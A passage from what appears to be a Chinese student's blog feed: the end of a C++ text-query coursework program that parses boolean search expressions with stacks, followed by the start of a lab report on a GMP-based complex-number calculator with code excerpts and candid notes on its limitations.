class="keyword">if</span> (opstack.<span class="built_in">empty</span>()||op==<span class="string">&#x27;(&#x27;</span>)&#123;<span class="comment">//或者左括号直接压栈</span></span><br><span class="line">                opstack.<span class="built_in">push</span>(op);</span><br><span class="line">                <span class="keyword">if</span>(i-word_start&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,i-word_start));</span><br><span class="line">                &#125;</span><br><span class="line">                word_start=i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(op ==<span class="string">&#x27;)&#x27;</span>)&#123;<span class="comment">//如果当前位置是右括号</span></span><br><span class="line">                <span class="keyword">if</span>(i-word_start&gt;<span class="number">0</span>)&#123;<span class="comment">//排除()遇到)的情况</span></span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,i-word_start));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(!opstack.<span class="built_in">empty</span>()&amp;&amp;opstack.<span class="built_in">top</span>()!=<span class="string">&#x27;(&#x27;</span>)&#123;<span class="comment">// 不断将栈中的元素弹出，直到遇到左括号</span></span><br><span class="line">                    <span class="function">string <span class="title">tempop</span><span class="params">(<span class="number">1</span>,opstack.top())</span></span>;</span><br><span class="line">                    opstack.<span class="built_in">pop</span>();</span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(tempop);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!opstack.<span class="built_in">empty</span>()&amp;&amp;opstack.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>)&#123;<span class="comment">//遇到左括号就将他弹出</span></span><br><span class="line">                    opstack.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式括号不匹配，请检查并重启程序 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                word_start=i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&#x27;~&#x27;</span>||op==<span class="string">&#x27;|&#x27;</span>||op==<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i-word_start&gt;<span class="number">0</span>)&#123;<span class="comment">//排除(~a)遇到~的情况</span></span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,i-word_start));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>((!opstack.<span class="built_in">empty</span>())&amp;&amp;(<span class="built_in">Precedence</span>(opstack.<span class="built_in">top</span>())&gt;=priority1))&#123;</span><br><span class="line">                    <span class="comment">// 如果栈不空，栈顶为运算符，并且栈顶运算符的优先级大于等于当前运算符的优先级</span></span><br><span class="line">                    <span class="function">string <span class="title">tempop</span><span class="params">(<span class="number">1</span>,opstack.top())</span></span>;</span><br><span class="line">                    opstack.<span class="built_in">pop</span>();</span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(tempop);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//再将操作符压入栈</span></span><br><span class="line">                opstack.<span class="built_in">push</span>(op);</span><br><span class="line">                word_start=i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="comment">//清空栈，放到后缀表达式</span></span><br><span class="line">    <span class="keyword">if</span>(!last_right)&#123;</span><br><span class="line">        backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,buf.<span class="built_in">size</span>()-word_start));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!opstack.<span class="built_in">empty</span>())&#123;<span class="comment">//如果op栈不空，弹出所有元素到后缀表达式</span></span><br><span class="line">        <span class="function">string <span class="title">tempop</span><span class="params">(<span class="number">1</span>,opstack.top())</span></span>;</span><br><span class="line">        opstack.<span class="built_in">pop</span>();</span><br><span class="line">        backexp.<span class="built_in">push_back</span>(tempop);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!Had_op)&#123;<span class="comment">//没有运算符，直接走捷径</span></span><br><span class="line">        <span class="function">Query <span class="title">onetime</span><span class="params">(IsNameReturn(buf))</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(filesearch)&#123;</span><br><span class="line">            <span class="function">OFileStream <span class="title">ofi</span><span class="params">(filename)</span></span>;</span><br><span class="line">            cout&lt;&lt;onetime.<span class="built_in">rep</span>()&lt;&lt;endl;</span><br><span class="line">            </span><br><span class="line">            onetime.<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">write</span>(ofi.<span class="built_in">getofsteram</span>());</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;写入成功&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;onetime.<span class="built_in">rep</span>()&lt;&lt;endl;</span><br><span class="line">            onetime.<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">print</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果有运算符，都在栈里面</span></span><br><span class="line">    <span class="keyword">while</span>(!backexp.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isOperater</span>(backexp.<span class="built_in">front</span>()))<span class="comment">//判断向量backexp里面的是不是运算符</span></span><br><span class="line">        &#123;</span><br><span class="line">            string opstr=backexp.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">if</span>(opstr==<span class="string">&quot;|&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式所需要的操作数不够... :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                shared_ptr&lt;Query&gt; temp1=qstack.<span class="built_in">top</span>();</span><br><span class="line">                <span class="comment">//temp1=qstack.top();</span></span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; temp2=qstack.<span class="built_in">top</span>(); </span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; result=<span class="built_in">make_shared</span>&lt;Query&gt;(*temp1.<span class="built_in">get</span>()|*temp2.<span class="built_in">get</span>());</span><br><span class="line">                qstack.<span class="built_in">push</span>(result);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(opstr==<span class="string">&quot;&amp;&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式所需要的操作数不够... :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="keyword">return</span> ;  </span><br><span class="line">                &#125;</span><br><span class="line">                shared_ptr&lt;Query&gt; temp1=qstack.<span class="built_in">top</span>();</span><br><span class="line">                <span class="comment">//temp1=qstack.top();</span></span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; temp2=qstack.<span class="built_in">top</span>();</span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; result=<span class="built_in">make_shared</span>&lt;Query&gt;(*temp1.<span class="built_in">get</span>()&amp;*temp2.<span class="built_in">get</span>());</span><br><span class="line">                qstack.<span class="built_in">push</span>(result);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(opstr==<span class="string">&quot;~&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()&lt;<span class="number">1</span>)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式所需要的操作数不够... :(&quot;</span>&lt;&lt;endl ; </span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                shared_ptr&lt;Query&gt; temp=qstack.<span class="built_in">top</span>();</span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; result=<span class="built_in">make_shared</span>&lt;Query&gt;(~(*temp.<span class="built_in">get</span>()));</span><br><span class="line">                qstack.<span class="built_in">push</span>(result);</span><br><span class="line">            &#125;</span><br><span class="line">            backexp.<span class="built_in">erase</span>(backexp.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;<span class="comment">//如果不是则执行下面，将Query对象入栈</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            qstack.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;Query&gt;(<span class="built_in">IsNameReturn</span>(backexp.<span class="built_in">front</span>())));<span class="comment">//栈里面的都是共享指针</span></span><br><span class="line">            backexp.<span class="built_in">erase</span>(backexp.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后所有运算操作完成</span></span><br><span class="line">    <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(filesearch)&#123;</span><br><span class="line">            <span class="function">OFileStream <span class="title">ofi</span><span class="params">(filename)</span></span>;</span><br><span class="line">            qstack.<span class="built_in">top</span>()-&gt;<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">write</span>(ofi.<span class="built_in">getofsteram</span>());</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;写入成功&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            qstack.<span class="built_in">top</span>()-&gt;<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;表达式可能出现错误，无法运算出唯一结果&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;选择需要的功能：&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1.文本格式化&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2.文本查询&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3.退出&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Your Choice: &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//对输入的buf进行判别</span></span><br><span class="line">    <span class="type">int</span> cho;</span><br><span class="line">    string buf;</span><br><span class="line"></span><br><span class="line">    string newbuf;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">menu</span>();</span><br><span class="line">        cin&gt;&gt;cho;</span><br><span class="line">        cin.<span class="built_in">ignore</span>();</span><br><span class="line">        <span class="keyword">switch</span> (cho)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//让用户输入路径</span></span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请输入读取的文件路径&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">                <span class="built_in">getline</span>(cin,buf);</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请指定每行最大的字符数n :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt;&quot;</span>;</span><br><span class="line">                <span class="type">int</span> num;</span><br><span class="line">                cin&gt;&gt;num;</span><br><span class="line">                cin.<span class="built_in">ignore</span>();</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请指定新文件保存的路径 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt;&quot;</span>;</span><br><span class="line">                <span class="built_in">getline</span>(cin,newbuf);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    ff=<span class="built_in">make_shared</span>&lt;FileFormatter&gt;(buf,newbuf,num);</span><br><span class="line">                    ff-&gt;<span class="built_in">readFromFile</span>();</span><br><span class="line">                    ff-&gt;formatText();</span><br><span class="line">                    ff-&gt;<span class="built_in">saveToFile</span>();</span><br><span class="line">                &#125;<span class="built_in">catch</span>(string str)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;错误的文件路径&quot;</span>&lt;&lt;buf&lt;&lt;<span class="string">&quot;导致打开异常 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;<span class="built_in">catch</span>(<span class="type">char</span> ch)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;错误的文件路径&quot;</span>&lt;&lt;buf&lt;&lt;<span class="string">&quot;导致写入异常 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请输入读取的文件路径&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">                <span class="built_in">getline</span>(cin,newbuf);<span class="comment">//buf就是路径</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    ifs=<span class="built_in">make_shared</span>&lt;IFileStream&gt;(newbuf);</span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">                    <span class="built_in">getline</span>(cin,buf);<span class="comment">//从输入流中读取一行数据到buf</span></span><br><span class="line">                    <span class="built_in">BlankFliter</span>(buf);<span class="comment">//首先排除空格的影响</span></span><br><span class="line">                    <span class="built_in">StringTraslate</span>(buf);</span><br><span class="line">                &#125;<span class="built_in">catch</span>(string str)&#123;</span><br><span class="line">                    cerr&lt;&lt;str;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;无效的选项:(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大学课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++第二次小项目——四则预算器</title>
      <link href="/2024/11/08/C-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E5%9B%9B%E5%88%99%E9%A2%84%E7%AE%97%E5%99%A8/"/>
      <url>/2024/11/08/C-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E5%9B%9B%E5%88%99%E9%A2%84%E7%AE%97%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="info"><a href="#info" class="headerlink" title=":::info"></a>:::info</h1><ol><li>使用C<u>完成代码，确保程序可由C</u>编译器（如g++）编译。</li><li>采用面向对象的思想编写程序，将复杂结构抽象成类，并对必要的运算符进行重载，以使<br>程序更为优雅可靠。</li><li>程序应以交互式方式运行，类似于Python的交互模式（思考一下，C++如何读取一<br>行？）。空格不应影响输入。</li><li>可尝试支持对复杂表达式的混合计算，如</li><li>可尝试支持科学计数法的输入，尝试支持大浮点数（如1.0e200等）。</li><li>可尝试支持大数，支持高精度计算（可调用相关高精度运算库）。</li><li>可尝试多种方式对代码进行优化，包括执行速度、功能等（如在交互中支持++，+&#x3D;，-<br>-，-&#x3D;，*&#x3D;，&#x2F;&#x3D;等操作）；可以尝试完善错误提示，让错误提示更加明确；尝试允许用户自<br>选输出方式，如是否采用科学计数法等；可内嵌帮助文档，通过特定指令能够输出对应帮<br>助文档。</li></ol><p><font style="color:rgb(0,0,0);">8. 请勿直接采用他人的复数实现代码。 </font></p><p><font style="color:rgb(0,0,0);">9. </font><font style="color:rgb(0,0,0);">项目报告需对需求进行分析，描述实现方案与项目特色。报告应包含核心代码并进行解 </font></p><p><font style="color:rgb(0,0,0);">释。如果编译运行复杂，请提供编译运行代码的说明。提供运行结果的展示（如截图）， </font></p><p><font style="color:rgb(0,0,0);">并尽量给出性能展示与分析。最后给出总结。同时，鼓励写上实现代码时遇到的困难以及 </font></p><p><font style="color:rgb(0,0,0);">相应的解决思路&#x2F;方案。</font></p><p>:::</p><p>先贴出结果，写出对应对的解析，然后写出总结</p><h1 id="CQsLA">实验报告解析</h1><h2 id="m04XU">写在前面</h2><p>:::info<br>写在前面</p><p>:::</p><p>为了让实验报告看起来更加清晰，写出我的基本算法思想。</p><p>数据来源是字符串，我写的东西就是对字符串进行处理，利用操作符分割成每个字符串入栈，利用双栈来实现表达式。表达式再根据Complex类对操作符的重载，然后计算，存储结果。</p><p>思想很简单，但是不足的地方有很多，后面的总结再来啰嗦吧。</p><h2 id="ILWlE">开始解析</h2><p>:::info</p><ol><li>使用C<u>完成代码，确保程序可由C</u>编译器（如g++）编译。</li><li>采用面向对象的思想编写程序，将复杂结构抽象成类，并对必要的运算符进行重载，以使<br>程序更为优雅可靠。</li></ol><p>:::</p><p>由于后面需要大数，因此引入gmpxx库，由于myms里面自带。我们之前通过VScode和mysm2搞了一下环境</p><p>因此我们的命令行参数设置如下即可，并且看到成功编译。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701349738450-4790cef0-9bb7-4f9a-bad2-5bc9dbe3e4ae.png"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701349761339-482e9b3e-3fe7-42b1-b3e5-6cd67242799f.png"></p><p>我们设计了一个Complex类，实部和虚部用两个高精度浮点类型mpf_t来表示。下面对一些运算符进行重载，包括对象是string类的和Complex类的，定义了一些方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:<span class="comment">//也设立两个负数的flag</span></span><br><span class="line">        <span class="type">mpf_t</span> realPart;<span class="comment">//实</span></span><br><span class="line">        <span class="type">mpf_t</span> imaginaryPart;<span class="comment">//虚</span></span><br><span class="line">    <span class="built_in">Complex</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(imaginaryPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(realPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_set_ui</span>(realPart,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">mpf_set_ui</span>(imaginaryPart,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Complex</span>(<span class="type">mpf_t</span> initx,<span class="type">mpf_t</span> inity)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(imaginaryPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(realPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_set</span>(realPart,initx);</span><br><span class="line">        <span class="built_in">mpf_set</span>(imaginaryPart,inity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">getx</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mpf_get_str</span>(<span class="literal">nullptr</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,realPart);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">gety</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mpf_get_str</span>(<span class="literal">nullptr</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,imaginaryPart);</span><br><span class="line">    &#125;</span><br><span class="line">    Complex &amp; <span class="keyword">operator</span>=(Complex b)</span><br><span class="line">    Complex <span class="keyword">operator</span>+(Complex b) <span class="type">const</span></span><br><span class="line">    Complex <span class="keyword">operator</span>-(Complex b) <span class="type">const</span></span><br><span class="line"></span><br><span class="line">    Complex <span class="keyword">operator</span>*(Complex b) <span class="type">const</span></span><br><span class="line"></span><br><span class="line">    Complex <span class="keyword">operator</span>/(Complex b) <span class="type">const</span></span><br><span class="line">    Complex <span class="keyword">operator</span>+(string buf) <span class="type">const</span></span><br><span class="line">    Complex <span class="keyword">operator</span>-(string buf) <span class="type">const</span></span><br><span class="line">    Complex <span class="keyword">operator</span>*(string buf) <span class="type">const</span></span><br><span class="line">    Complex <span class="keyword">operator</span>/(string buf) <span class="type">const</span></span><br><span class="line">    string <span class="built_in">mod</span>() <span class="type">const</span></span><br><span class="line">    string <span class="built_in">con</span>() <span class="type">const</span></span><br><span class="line">    string <span class="built_in">alldata</span>() <span class="type">const</span></span><br><span class="line">    string <span class="built_in">realdata</span>() <span class="type">const</span></span><br><span class="line">    string <span class="built_in">imagdata</span>() <span class="type">const</span></span><br><span class="line">    <span class="type">void</span> <span class="built_in">print</span>()<span class="type">const</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>:::info<br><font style="color:rgb(0,0,0);">3. </font><font style="color:rgb(0,0,0);">程序应以交互式方式运行，类似于</font><font style="color:rgb(0,0,0);">Python</font><font style="color:rgb(0,0,0);">的交互模式（思考一下，</font><font style="color:rgb(0,0,0);">C++</font><font style="color:rgb(0,0,0);">如何读取一 </font></p><p><font style="color:rgb(0,0,0);">行？）。空格不应影响输入。</font></p><p>:::</p><blockquote><p><font style="color:rgb(0,0,0);">如果用户输入复数，且复数有效，则用自行定义的统一格式打印该复数，若格式错 </font></p><p><font style="color:rgb(0,0,0);">误，则打印错误信息（程序仍继续执行）。可参考如下（也可以自行统一格式）：</font></p></blockquote><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701352809967-5ce1e3bd-8ade-430e-bfe5-7ca9e649b4d2.png"></p><blockquote><p><font style="color:rgb(0,0,0);">对于赋值操作，程序应保存相应变量名和复数值，并支持变量覆盖操作（可以通过赋 </font></p><p><font style="color:rgb(0,0,0);">值覆盖原来数值）（有效变量名可以参考</font><font style="color:rgb(0,0,0);">C++</font><font style="color:rgb(0,0,0);">有效变量名标准，如变量名只能是字母 </font></p><p><font style="color:rgb(0,0,0);">（</font><font style="color:rgb(0,0,0);">A-Z</font><font style="color:rgb(0,0,0);">，</font><font style="color:rgb(0,0,0);">a-z</font><font style="color:rgb(0,0,0);">）和数字（</font><font style="color:rgb(0,0,0);">0-9</font><font style="color:rgb(0,0,0);">）或者下划线（</font><font style="color:rgb(0,0,0);">_</font><font style="color:rgb(0,0,0);">）组成。第一个字母必须是字母或者下划 </font></p><p><font style="color:rgb(0,0,0);">线开头。变量名区分大小写。变量名不能为</font><font style="color:rgb(0,0,0);">“i”</font><font style="color:rgb(0,0,0);">等预设名称。保存变量可以参考使用</font><font style="color:rgb(0,0,0);">unordered_map </font><font style="color:rgb(0,0,0);">等容器）。若输入为已赋值变量，则输出该变量及相应复数值，若 </font></p><p><font style="color:rgb(0,0,0);">未定义变量，则提示错误。</font></p></blockquote><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701352766040-0cfdb9ff-f352-4f2d-95ff-b2093b13798c.png"></p><blockquote><p><font style="color:rgb(0,0,0);">支持变量间的加减乘除法</font></p></blockquote><p>在此前先说明，我创建的无序图键值对分别是，一个变量名对应一个字符串</p><p>然而因为我写的算法的原因并不支持复杂变量间的加减乘除运算，这是因为我在处理这些变量的时候等价于利用宏直接进行一个替换成一个字符串。</p><p>如果创建无序图的时候</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701353501824-daebade0-875e-47a1-9de5-6c160279f1b5.png"></p><blockquote><p><font style="color:rgb(0,0,0);">支持模运算和赋值，</font></p></blockquote><p>在这一点，对mod还算是比较成功的….</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701354226233-6be07421-caa6-4e1f-a438-9dbbb1a8d165.png"></p><blockquote><p><font style="color:rgb(0,0,0);">支持求共轭复数</font></p></blockquote><p>con的话，因为代码算法的局限性，只完成了一点</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701354794270-f576b8e0-62db-4e0e-b390-78f4269d4d0f.png"></p><blockquote><p><font style="color:rgb(0,0,0);">（</font><strong><font style="color:rgb(0,0,0);">选做</font></strong><font style="color:rgb(0,0,0);">）支持变量的连续的加减乘除法（同个运算），并可支持变量与数的混合运 </font></p><p><font style="color:rgb(0,0,0);">算，括号解析（对于乘除法），和相应变量赋值</font></p></blockquote><p>乘除法就算了，因为变量间都是宏替换的，实现不了….</p><p>但是加法肯定没问题，图中4.099999999999999999999我猜是因为mpf的局限，表示不了4.1，这里后面总结会说到这个东西。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701354896959-57c971a9-40ca-4728-8376-6ad94d97a4d9.png"></p><p>这里展示一下常数的乘除法</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701355022399-5fd325cf-506d-4a5f-aa43-248bb02cd96c.png"></p><p>:::info<br><font style="color:rgb(0,0,0);">4. 可尝试支持对复杂表达式的混合计算，如</font></p><p>:::</p><p>然而并不可以，因为程序残次，解析括号花费了挺多时间，也没有解决，我的评价是不如直接用mpf（或者其他高精度库）的栈，不用string的。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1701355309671-8dc90039-d06c-4f31-aa67-ee6cfb59a63a.png"></p><p>为什么这里a,b,c都有初始化，还会提示非法变量呢？</p><p>明显和我们的变量转换函数有关，我这里的思路是组部分解析buf，就是从0开始找，如果找到了就标记当前的下标，我们从当前下标开始找。这样有个问题，就是我们是abc顺序插入umap的，这里猜测umap存储是cba的一个链表，所以我们找到c的时候，就已经跳过了a和b</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">NameTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;</span><br><span class="line">    string::const_iterator it = buf.<span class="built_in">begin</span>();</span><br><span class="line">    string::const_iterator word_start;</span><br><span class="line">    string::const_iterator word_end;</span><br><span class="line">    string word;</span><br><span class="line">    <span 